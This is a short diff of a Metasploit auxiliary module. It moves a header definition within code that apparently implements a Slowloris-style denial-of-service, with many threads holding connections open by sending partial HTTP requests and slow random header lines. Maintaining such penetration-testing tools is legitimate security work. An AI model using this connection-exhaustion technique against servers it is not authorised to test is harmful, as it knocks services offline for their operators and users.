@@ -45,8 +45,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
       starting_thread = 1
+      header = "GET / HTTP/1.1\r\n"
+    
       while true do
         ubound = [thread_count].min
         print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
@@ -56,7 +57,6 @@ class MetasploitModule < Msf::Auxiliary
           threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
             begin
               connect()
-              header = "GET / HTTP/1.1\r\n"
               sock.puts(header)
               10.times do
                 data = "X-a-#{rand(0..1000)}: b\r\n"
